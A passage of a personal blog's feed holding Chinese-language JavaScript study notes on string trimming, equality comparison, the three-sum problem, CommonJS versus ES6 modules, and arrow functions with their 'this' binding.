whitespace.indexOf(str.charAt(i)) != -1)&#123;  </span><br><span class="line">            i--;  </span><br><span class="line">        &#125;  </span><br><span class="line">        str = str.substring(0, i+1);  </span><br><span class="line">    &#125;  </span><br><span class="line">    return str;  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><ol start="2"><li>正则替换</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT LANGUAGE=&quot;JavaScript&quot;&gt;  </span><br><span class="line">String.prototype.Trim = function()  &#123;  </span><br><span class="line">    return this.replace(/(^\s*)|(\s*$)/g, &quot;&quot;);  </span><br><span class="line">&#125;  </span><br><span class="line">String.prototype.LTrim = function()  &#123;  </span><br><span class="line">    return this.replace(/(^\s*)/g, &quot;&quot;);  </span><br><span class="line">&#125;  </span><br><span class="line">String.prototype.RTrim = function()  &#123;  </span><br><span class="line">    return this.replace(/(\s*$)/g, &quot;&quot;);  </span><br><span class="line">&#125;  </span><br><span class="line">&lt;/SCRIPT&gt; </span><br></pre></td></tr></table></figure><ol start="3"><li>使用jquery</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$.trim(str) </span><br><span class="line">//jquery内部实现为：</span><br><span class="line">function trim(str)&#123;   </span><br><span class="line">    return str.replace(/^(\s|\u00A0)+/,&#x27;&#x27;).replace(/(\s|\u00A0)+$/,&#x27;&#x27;);   </span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure><ol start="4"><li>使用motools</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function trim(str)&#123;   </span><br><span class="line">    return str.replace(/^(\s|\xA0)+|(\s|\xA0)+$/g, &#x27;&#x27;);   </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><ol start="5"><li>裁剪字符串方式</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function trim(str)&#123;   </span><br><span class="line">    str = str.replace(/^(\s|\u00A0)+/,&#x27;&#x27;);   </span><br><span class="line">    for(var i=str.length-1; i&gt;=0; i--)&#123;   </span><br><span class="line">        if(/\S/.test(str.charAt(i)))&#123;   </span><br><span class="line">            str = str.substring(0, i+1);   </span><br><span class="line">            break;   </span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;   </span><br><span class="line">    return str;   </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h1 id="“判断输出console-log-0-console-log-1-1-”"><a href="#“判断输出console-log-0-console-log-1-1-”" class="headerlink" title="“判断输出console.log(0 == [])console.log([1] == [1])”"></a>“判断输出console.log(0 == [])console.log([1] == [1])”</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">console.log([]==[]);  // false</span><br><span class="line">console.log([]== 0);  // true</span><br></pre></td></tr></table></figure><p><strong>原始值的比较是值的比较</strong>：<br>它们的值相等时它们就相等（<code>==</code>）<br>对象和原始值不同，<font color="#FF00FF">对象的比较并非值的比较,而是引用的比较</font>：<br>即使两个对象包含同样的属性及相同的值，它们也是不相等的<br>即使两个数组各个索引元素完全相等，它们也是不相等的,所以[]!=[]</p><p>[]<code>==</code>0,是数组进行了隐式转换，空数组会转换成数字0，所以相等</p><h1 id="三数之和"><a href="#三数之和" class="headerlink" title="三数之和"></a>三数之和</h1><p><strong>题目描述</strong><br>给定一个包含 n 个整数的数组 nums，判断 nums 中是否存在三个元素 a，b，c ，使得 a + b + c = 0 ？找出所有满足条件且不重复的三元组。</p><p>注意：答案中不可以包含重复的三元组。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//例如, 给定数组 nums = [-1, 0, 1, 2, -1, -4]，</span><br><span class="line">//满足要求的三元组集合为：</span><br><span class="line">[</span><br><span class="line">  [-1, 0, 1],</span><br><span class="line">  [-1, -1, 2]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><strong>这题我们才用排序+双指针的思路来做，遍历排序后的数组，定义指针l和r,分别从当前遍历元素的下一个元素和数组的最后一个元素往中间靠拢，计算结果跟目标对比。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @param &#123;number[]&#125; nums</span><br><span class="line"> * @return &#123;number[][]&#125;</span><br><span class="line"> */</span><br><span class="line">var threeSum = function (nums) &#123;</span><br><span class="line">  if (nums.length &lt; 3) &#123;</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line">  nums.sort((a, b) =&gt; a - b);</span><br><span class="line">  let res = [];</span><br><span class="line">  for (let i = nums.length - 1; i &gt;= 0; i--) &#123;</span><br><span class="line">    if (i &lt; nums.length &amp;&amp; nums[i] === nums[i + 1]) &#123;</span><br><span class="line">      // 左到右，已知i+1的数结果，跳过重复值去重</span><br><span class="line">      continue;</span><br><span class="line">    &#125;</span><br><span class="line">    if (nums[i] &lt; 0) &#123;</span><br><span class="line">      // 右-&gt;左</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">    let l = 0,</span><br><span class="line">      r = i - 1;</span><br><span class="line">    while (l &lt; r) &#123;</span><br><span class="line">      let sum = nums[i] + nums[l] + nums[r];</span><br><span class="line">      if (sum === 0) &#123;</span><br><span class="line">        res.push([nums[i], nums[l], nums[r]]);</span><br><span class="line">        while (l &lt; r &amp;&amp; nums[l] === nums[l + 1]) &#123;</span><br><span class="line">          l++;</span><br><span class="line">        &#125;</span><br><span class="line">        while (l &lt; r &amp;&amp; nums[r] === nums[r - 1]) &#123;</span><br><span class="line">          r--;</span><br><span class="line">        &#125;</span><br><span class="line">        l++;</span><br><span class="line">        r--;</span><br><span class="line">      &#125; else if (sum &lt; 0) &#123;</span><br><span class="line">        l++;</span><br><span class="line">      &#125; else if (sum &gt; 0) &#123;</span><br><span class="line">        r--;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://files.shanqianche.cn/20228/1659618073234.png" alt="力扣"></p>]]></content>
    
    
    <summary type="html">每天学习计划</summary>
    
    
    
    <category term="plan" scheme="https://merlynr.github.io/categories/plan/"/>
    
    
    <category term="daily" scheme="https://merlynr.github.io/tags/daily/"/>
    
    <category term="study" scheme="https://merlynr.github.io/tags/study/"/>
    
    <category term="graduate student" scheme="https://merlynr.github.io/tags/graduate-student/"/>
    
    <category term="plan" scheme="https://merlynr.github.io/tags/plan/"/>
    
  </entry>
  
  <entry>
    <title>模块化(第九天)</title>
    <link href="https://merlynr.github.io/2022/08/04/%E6%A8%A1%E5%9D%97%E5%8C%96(%E7%AC%AC%E4%B9%9D%E5%A4%A9)/"/>
    <id>https://merlynr.github.io/2022/08/04/%E6%A8%A1%E5%9D%97%E5%8C%96(%E7%AC%AC%E4%B9%9D%E5%A4%A9)/</id>
    <published>2022-08-03T16:00:00.000Z</published>
    <updated>2022-08-03T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CommonJS规范"><a href="#CommonJS规范" class="headerlink" title="CommonJS规范"></a>CommonJS规范</h1><p>CommonJS规范加载模块是<font color="#FF8C00">同步</font>的，只有加载完成，才能执行后面的操作。<br>CommonJS规范中的module、exports和require</p><ul><li>每个文件就是一个模块，有自己的作用域。每个模块内部，<font color="#FF00FF">module变量代表当前模块，是一个对象，它的exports属性（即module.exports）是对外的接口。</font></li><li><font color="#FF8C00">module.exports属性表示当前模块对外输出的接口，其他文件加载该模块，实际上就是读取module.exports变量</font>。</li><li>为了方便，Node为每个模块提供一个exports变量，指向module.exports。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">let exports = module.exports;</span><br></pre></td></tr></table></figure><blockquote><p> //name.js<br>  exports.name = function(){return ‘李婷婷’}; //导出<br>  //getName.js<br>  let getName = require(‘name’); //引入</p></blockquote><p><font color="#FF00FF">不能直接将exports变量指向一个值，因为这样等于切断了exports与module.exports的联系</font>：如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exports = function(x)&#123;console.log(x)&#125;</span><br></pre></td></tr></table></figure><p><font color="#FF00FF">如果一个模块的对外接口，就是一个单一的值，不能使用exports输出，只能使用module.exports输出</font>。</p><p>CommonJS模块导入用require，导出用module.exports。导出的对象需注意，<font color="#FF00FF">如果是静态值，而且非常量，后期可能会有所改动的，请使用函数动态获取，否则无法获取修改值</font>。导入的参数，是可以随意改动的，所以使用时要注意</p><h1 id="ES6-module-和-CommonJS-module-的区别"><a href="#ES6-module-和-CommonJS-module-的区别" class="headerlink" title="ES6 module 和 CommonJS module 的区别"></a>ES6 module 和 CommonJS module 的区别</h1><ul><li>为CommonJS的require语法是同步的，所以就导致了<strong>CommonJS</strong>模块规范<font color="#FF00FF">只适合用在服务端</font>，而<strong>ES6模块无论是在浏览器端还是服务端都是可以使用的，但是在服务端中，还需要遵循一些特殊的规则才能使用</strong> ；</li><li>CommonJS 模块输出的是一个<font color="#FF00FF">值的拷贝</font>，而ES6 模块输出的是<font color="#FF00FF">值的引用</font>；</li><li>CommonJS 模块是运行时加载，而ES6 模块是编译时输出接口，使得对JS的模块进行静态分析成为了可能</li><li>因为两个模块加载机制的不同，所以在对待循环加载的时候，它们会有不同的表现。<font color="#FF00FF">CommonJS遇到循环依赖的时候，只会输出已经执行的部分，后续的输出或者变化，是不会影响已经输出的变量。而ES6模块相反，使用import加载一个变量，变量不会被缓存，真正取值的时候就能取到最终的值；</font></li><li>关于模块顶层的this指向问题，<font color="#FF00FF">在CommonJS顶层，this指向当前模块；而在ES6模块中，this指向undefined；</font></li><li>关于两个模块互相引用的问题，<font color="#FF00FF">在ES6模块当中，是支持加载CommonJS模块的。但是反过来，CommonJS并不能requireES6模块，在NodeJS中，两种模块方案是分开处理的</font>。<h1 id="ES6-module、CommonJS-module-循环引用的问题"><a href="#ES6-module、CommonJS-module-循环引用的问题" class="headerlink" title="ES6 module、CommonJS module 循环引用的问题"></a>ES6 module、CommonJS module 循环引用的问题</h1></li><li><em>循环加载指的是a脚本的执行依赖b脚本，b脚本的执行依赖a脚本</em>*</li></ul><ol><li><font color="#FF00FF">CommonJS模块是加载时执行。一旦出现某个模块被“循环加载”，就只输出已经执行的部分，没有执行的部分不会输出</font>。</li><li><font color="#FF00FF">ES6模块对导出模块，变量，对象是动态引用，遇到模块加载命令import时不会去执行模块，只是生成一个指向被加载模块的引用。</font></li></ol><p>CommonJS模块规范主要适用于后端Node.js，后端Node.js是<font color="#FF00FF">同步</font>模块加载，所以在模块循环引入时模块已经执行完毕。推荐前端工程中使用ES6的模块规范，<font color="#FF8C00">通过安装Babel转码插件支持ES6模块引入</font>的语法。</p><h2 id="CommonJS模块的加载原理"><a href="#CommonJS模块的加载原理" class="headerlink" title="CommonJS模块的加载原理"></a>CommonJS模块的加载原理</h2><p>CommonJS模块就是一个脚本文件，require命令第一次加载该脚本时就会执行整个脚本，然后在内存中生成该模块的一个说明对象。</p><blockquote><p>{<br>    id: ‘’,  //模块名，唯一<br>    exports: {  //模块输出的各个接口<br>        …<br>    },<br>    loaded: true,  //模块的脚本是否执行完毕<br>    …<br>}</p></blockquote><p>以后用到这个模块时，就会到对象的exports属性中取值。<font color="#FF8C00">即使再次执行require命令，也不会再次执行该模块，而是到缓存中取值。</font></p><p><font color="#FF00FF">CommonJS模块是加载时执行，即脚本代码在require时就全部执行。一旦出现某个模块被“循环加载”，就只输出已经执行的部分，没有执行的部分不会输出</font>。</p><p><strong>案例说明：</strong></p><blockquote><p>//a.js<br>exports.done = false;<br>var b = require(‘./b.js’);<br>console.log(‘在a.js中，b.done = %j’, b.done);<br>exports.done = true;<br>console.log(‘a.js执行完毕！’)<br>//b.js<br>exports.done = false;<br>var a = require(‘./a.js’);<br>console.log(‘在b.js中，a.done = %j’, a.done);<br>exports.done = true;<br>console.log(‘b.js执行完毕！’)<br>//main.js<br>var a = require(‘./a.js’);<br>var b = require(‘./b.js’);<br>console.log(‘在main.js中，a.done = %j, b.done = %j’, a.done, b.done);</p></blockquote><p><strong>输出结果如下：</strong></p><blockquote><p>//node环境下运行main.js<br>node main.js<br>在b.js中，a.done = false<br>b.js执行完毕！<br>在a.js中，b.done = true<br>a.js执行完毕！<br>在main.js中，a.done = true, b.done = true</p></blockquote><p><strong>JS代码执行顺序如下：</strong><br>1）main.js中先加载a.js，a脚本先输出done变量，值为false，然后加载b脚本，a的代码停止执行，等待b脚本执行完成后，才会继续往下执行。<br>2）b.js执行到第二行会去加载a.js，这时发生循环加载，系统会去a.js模块对应对象的exports属性取值，因为a.js没执行完，从exports属性只能取回已经执行的部分，未执行的部分不返回，所以取回的值并不是最后的值。<br>3）a.js已执行的代码只有一行，exports.done = false;所以对于b.js来说，require a.js只输出了一个变量done，值为false。往下执行console.log(‘在b.js中，a.done = %j’, a.done);控制台打印出：</p><blockquote><p>在b.js中，a.done = false</p></blockquote><p>4）b.js继续往下执行，done变量设置为true，console.log(‘b.js执行完毕！’)，等到全部执行完毕，将执行权交还给a.js。此时控制台输出：</p><blockquote><p>b.js执行完毕！</p></blockquote><p>5）执行权交给a.js后，a.js接着往下执行，执行console.log(‘在a.js中，b.done = %j’, b.done);控制台打印出：</p><blockquote><p>在a.js中，b.done = true</p></blockquote><p>6）a.js继续执行，变量done设置为true，直到a.js执行完毕。</p><blockquote><p>a.js执行完毕！</p></blockquote><p>7）main.js中第二行不会再次执行b.js，直接输出缓存结果。最后控制台输出：</p><blockquote><p>在main.js中，a.done = true, b.done = true</p></blockquote><p><strong>总结：</strong></p>]]></content>
    
    
    <summary type="html">每天学习计划</summary>
    
    
    
    <category term="plan" scheme="https://merlynr.github.io/categories/plan/"/>
    
    
    <category term="daily" scheme="https://merlynr.github.io/tags/daily/"/>
    
    <category term="study" scheme="https://merlynr.github.io/tags/study/"/>
    
    <category term="graduate student" scheme="https://merlynr.github.io/tags/graduate-student/"/>
    
    <category term="plan" scheme="https://merlynr.github.io/tags/plan/"/>
    
  </entry>
  
  <entry>
    <title>ES5 vs ES6</title>
    <link href="https://merlynr.github.io/2022/08/03/ES5%20vs%20ES6(%E7%AC%AC%E5%85%AD%E5%A4%A9)/"/>
    <id>https://merlynr.github.io/2022/08/03/ES5%20vs%20ES6(%E7%AC%AC%E5%85%AD%E5%A4%A9)/</id>
    <published>2022-08-02T16:00:00.000Z</published>
    <updated>2022-08-02T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="es6中箭头函数"><a href="#es6中箭头函数" class="headerlink" title="es6中箭头函数"></a>es6中箭头函数</h1><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>ES6中允许使用箭头=&gt;来定义箭头函数，具体语法，我们来看一个简单的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 箭头函数</span><br><span class="line">let fun = (name) =&gt; &#123;</span><br><span class="line">    // 函数体</span><br><span class="line">    return `Hello $&#123;name&#125; !`;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// 等同于</span><br><span class="line">let fun = function (name) &#123;</span><br><span class="line">    // 函数体</span><br><span class="line">    return `Hello $&#123;name&#125; !`;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看出，定义箭头函在数语法上要比普通函数简洁得多。箭头函数省去了function关键字，采用箭头=&gt;来定义函数。函数的参数放在=&gt;前面的括号中，函数体跟在=&gt;后的花括号中。</p><p><strong>关于箭头函数的参数：</strong><br>① 如果箭头函数没有参数，直接写一个空括号即可。<br>② 如果箭头函数的参数只有一个，也可以省去包裹参数的括号。<br>③ 如果箭头函数有多个参数，将参数依次用逗号(,)分隔，包裹在括号中即可。、</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// 没有参数</span><br><span class="line">let fun1 = () =&gt; &#123;</span><br><span class="line">    console.log(111);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// 只有一个参数，可以省去参数括号</span><br><span class="line">let fun2 = name =&gt; &#123;</span><br><span class="line">    console.log(`Hello $&#123;name&#125; !`)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// 有多个参数</span><br><span class="line">let fun3 = (val1, val2, val3) =&gt; &#123;</span><br><span class="line">    return [val1, val2, val3];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>关于箭头函数的函数体：</strong><br>① 如果箭头函数的函数体只有一句代码，就是简单返回某个变量或者返回一个简单的JS表达式，可以省去函数体的大括号{ }。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">let f = val =&gt; val;</span><br><span class="line">// 等同于</span><br><span class="line">let f = function (val) &#123; return val &#125;;</span><br><span class="line"></span><br><span class="line">let sum = (num1, num2) =&gt; num1 + num2;</span><br><span class="line">// 等同于</span><br><span class="line">let sum = function(num1, num2) &#123;</span><br><span class="line">  return num1 + num2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>② 如果箭头函数的函数体只有一句代码，就是返回一个对象，可以像下面这样写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 用小括号包裹要返回的对象，不报错</span><br><span class="line">let getTempItem = id =&gt; (&#123; id: id, name: &quot;Temp&quot; &#125;);</span><br><span class="line"></span><br><span class="line">// 但绝不能这样写，会报错。</span><br><span class="line">// 因为对象的大括号会被解释为函数体的大括号</span><br><span class="line">let getTempItem = id =&gt; &#123; id: id, name: &quot;Temp&quot; &#125;;</span><br></pre></td></tr></table></figure><p>③ 如果箭头函数的函数体只有一条语句并且不需要返回值（最常见是调用一个函数），<font color="#FF00FF">可以给这条语句前面加一个void关键字</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">let fn = () =&gt; void doesNotReturn();</span><br></pre></td></tr></table></figure><p>箭头函数最常见的用处就是简化回调函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// 例子一</span><br><span class="line">// 正常函数写法</span><br><span class="line">[1,2,3].map(function (x) &#123;</span><br><span class="line">  return x * x;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// 箭头函数写法</span><br><span class="line">[1,2,3].map(x =&gt; x * x);</span><br><span class="line"></span><br><span class="line">// 例子二</span><br><span class="line">// 正常函数写法</span><br><span class="line">var result = [2, 5, 1, 4, 3].sort(function (a, b) &#123;</span><br><span class="line">  return a - b;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// 箭头函数写法</span><br><span class="line">var result = [2, 5, 1, 4, 3].sort((a, b) =&gt; a - b);</span><br></pre></td></tr></table></figure><h2 id="箭头函数与普通函数的区别"><a href="#箭头函数与普通函数的区别" class="headerlink" title="箭头函数与普通函数的区别"></a>箭头函数与普通函数的区别</h2><ol><li>语法更加简洁、清晰<br>从上面的基本语法示例中可以看出，箭头函数的定义要比普通函数定义简洁、清晰得多，很快捷。</li><li>箭头函数不会创建自己的this<br><font color="#FF8C00">箭头函数没有自己的this</font>，它会捕获自己在定义时（注意，是<font color="#FF00FF">定义时，</font>不是调用时）所处的外层执行环境的this，并继承这个this值。所以，箭头函数中this的指向在它被定义的时候就已经确定了，之后<font color="#FF8C00">永远不会改变</font>。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">var id = &#x27;Global&#x27;;</span><br><span class="line"></span><br><span class="line">function fun1() &#123;</span><br><span class="line">    // setTimeout中使用匿名函数</span><br><span class="line">    setTimeout(function()&#123;</span><br><span class="line">        console.log(this.id);</span><br><span class="line">    &#125;, 2000);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function fun2() &#123;</span><br><span class="line">    // setTimeout中使用箭头函数</span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">        console.log(this.id);</span><br><span class="line">    &#125;, 2000)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fun1.call(&#123;id: &#x27;Obj&#x27;&#125;);     // &#x27;Global&#x27;</span><br><span class="line"></span><br><span class="line">fun2.call(&#123;id: &#x27;Obj&#x27;&#125;);     // &#x27;Obj&#x27;</span><br></pre></td></tr></table></figure><p>上面这个例子，函数fun1中的setTimeout中使用匿名函数，2秒后函数执行时，这时函数其实是<font color="#FF8C00">在全局作用域</font>执行的，所以this指向Window对象，this.id就指向全局变量id，所以输出’Global’。 但是函数fun2中的setTimeout中使用的是箭头函数，这个箭头函数的this在定义时就确定了，它继承了它外层fun2的执行环境中的this，而fun2调用时this被call方法改变到了对象{id: ‘Obj’}中，所以输出’Obj’</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var id = &#x27;GLOBAL&#x27;;</span><br><span class="line">var obj = &#123;</span><br><span class="line">  id: &#x27;OBJ&#x27;,</span><br><span class="line">  a: function()&#123;</span><br><span class="line">    console.log(this.id);</span><br><span class="line">  &#125;,</span><br><span class="line">  b: () =&gt; &#123;</span><br><span class="line">    console.log(this.id);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.a();    // &#x27;OBJ&#x27;</span><br><span class="line">obj.b();    // &#x27;GLOBAL&#x27;</span><br></pre></td></tr></table></figure><p>上面这个例子，对象obj的方法a使用普通函数定义的，普通函数作为<font color="#FF00FF">对象的方法</font>调用时，this指向它所属的对象。所以，this.id就是obj.id，所以输出’OBJ’。 但是方法b是使用箭头函数定义的，箭头函数中的this实际是继承的它定义时所处的全局执行环境中的this，所以指向Window对象，所以输出’GLOBAL’。（这里要注意，<font color="#bf242a">定义对象的大括号{}是无法形成一个单独的执行环境的，它依旧是处于全局执行环境中！！</font>）</p><h2 id="箭头函数继承而来的this指向永远不变"><a href="#箭头函数继承而来的this指向永远不变" class="headerlink" title="箭头函数继承而来的this指向永远不变"></a>箭头函数继承而来的this指向永远不变</h2><p>上面的例子，就完全可以说明箭头函数继承而来的this指向永远不变。<font color="#FF00FF">对象obj的方法b是使用箭头函数定义的，这个函数中的this就永远指向它定义时所处的全局执行环境中的this</font>，即便这个函数是作为对象obj的方法调用，this依旧指向Window对象。</p><h2 id="call-apply-bind-无法改变箭头函数中this的指向"><a href="#call-apply-bind-无法改变箭头函数中this的指向" class="headerlink" title="call()/.apply()/.bind()无法改变箭头函数中this的指向"></a>call()/.apply()/.bind()无法改变箭头函数中this的指向</h2><p>.call()/.apply()/.bind()方法可以用来动态修改函数执行时this的指向，但由于箭头函数的this定义时就已经确定且永远不会改变。所以使用这些方法永远也改变不了箭头函数this的指向，<font color="#FF00FF">虽然这么做代码不会报错。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var id = &#x27;Global&#x27;;</span><br><span class="line">// 箭头函数定义在全局作用域</span><br><span class="line">let fun1 = () =&gt; &#123;</span><br><span class="line">    console.log(this.id)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">fun1();     // &#x27;Global&#x27;</span><br><span class="line">// this的指向不会改变，永远指向Window对象</span><br><span class="line">fun1.call(&#123;id: &#x27;Obj&#x27;&#125;);     // &#x27;Global&#x27;</span><br><span class="line">fun1.apply(&#123;id: &#x27;Obj&#x27;&#125;);    // &#x27;Global&#x27;</span><br><span class="line">fun1.bind(&#123;id: &#x27;Obj&#x27;&#125;)();   // &#x27;Global&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="箭头函数不能作为构造函数使用"><a href="#箭头函数不能作为构造函数使用" class="headerlink" title="箭头函数不能作为构造函数使用"></a>箭头函数不能作为构造函数使用</h2><p><a href="https://juejin.cn/post/6871454580161380365">当我们new一个构造函数时，发生了什么？ - 掘金</a><br>我们先了解一下<font color="#FF8C00">构造函数的new</font>都做了些什么？简单来说，分为四步： ① JS内部首先会先生成一个空对象； ② 再把函数中的this指向该对象； ③ 然后执行构造函数中的语句； ④ 最终返回该对象实例</p><p><font color="#9400D3">但是因为箭头函数没有自己的this，它的this其实是继承了外层执行环境中的this，且this指向永远不会随在哪里调用、被谁调用而改变，所以箭头函数不能作为构造函数使用，或者说构造函数不能定义成箭头函数，否则用new调用时会报错</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">let Fun = (name, age) =&gt; &#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.age = age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// 报错</span><br><span class="line">let p = new Fun(&#x27;cao&#x27;, 24);</span><br></pre></td></tr></table></figure><h2 id="箭头函数没有自己的arguments"><a href="#箭头函数没有自己的arguments" class="headerlink" title="箭头函数没有自己的arguments"></a>箭头函数没有自己的arguments</h2><p>箭头函数没有自己的arguments对象。<font color="#FF00FF">在箭头函数中访问arguments实际上获得的是外层局部（函数）执行环境中的值。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 